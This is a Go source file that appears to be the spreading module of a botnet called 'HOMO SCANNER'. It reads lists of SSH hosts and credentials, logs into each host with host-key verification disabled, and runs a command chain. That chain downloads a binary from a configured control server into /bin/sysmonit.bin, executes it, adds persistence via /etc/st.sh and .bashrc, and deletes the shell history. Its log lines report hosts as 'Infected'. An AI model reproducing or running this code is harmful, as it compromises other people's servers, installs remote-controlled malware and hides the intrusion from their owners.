package server

import (
	"bytes"
	"fmt"
	"homo/network/config"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type Sshsess struct {
	Ip       string
	Password string
	Login    string
	Config   *ssh.ClientConfig
	Session  *ssh.Client
}

var wg sync.WaitGroup

func Scan() {

	defer func() { // try catch
		if er := recover(); er != nil {
			println("Scan: ")
			fmt.Print(er)
			return
		}
	}()

	data, err := os.ReadFile("./data/servers.txt")
	if err != nil {
		fmt.Println("Read servers: " + err.Error())
	}

	for _, i := range strings.Split(string(data), "\n") {
		serv := strings.Split(string(i), ":")

		if len(serv) < 2 {
			continue
		}

		ses, err := sshNew(serv[1], serv[2], serv[0])
		if err != nil {
			fmt.Println("[HOMO SCANNER] Can't Infect: " + serv[0] + ":22")
			return
		}

		ses.Inject()
		fmt.Println("[HOMO SCANNER] Infected: " + serv[0] + ":22")
		time.Sleep(1 * time.Second)

	}
}

func sshNew(login, pass string, host string) (*Sshsess, error) {

	conf := &ssh.ClientConfig{
		User:    login,
		Timeout: 5 * time.Second,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	conn, err := ssh.Dial("tcp", host+":22", conf)

	if err != nil {
		return &Sshsess{}, err
	}

	return &Sshsess{
		Ip:       host,
		Password: pass,
		Login:    login,
		Config:   conf,
		Session:  conn,
	}, nil
}

func (sess *Sshsess) Inject() {

	sshSesh, _ := sess.Session.NewSession()
	var setSession bytes.Buffer
	sshSesh.Stdout = &setSession

	var host string
	if !config.GetConfig().Api.CustomPathEnabled {
		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + "/SXkmarwet7vghj"
	} else {
		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + config.GetConfig().Api.CustomPath
	}

	host = host
	go func() {

		sshSesh.Run("apt install curl -y; ulimit -n 999999; rm /bin/sysmonit.bin; curl -X POST http://" + host + " -o /bin/sysmonit.bin ; chmod +x /bin/sysmonit.bin ; /bin/sysmonit.bin & disown >> /etc/st.sh ; bash /etc/st.sh >> ~/.bashrc; bash /etc/st.sh ; rm ~/.bash_history")

		sshSesh.Close()

	}()
}
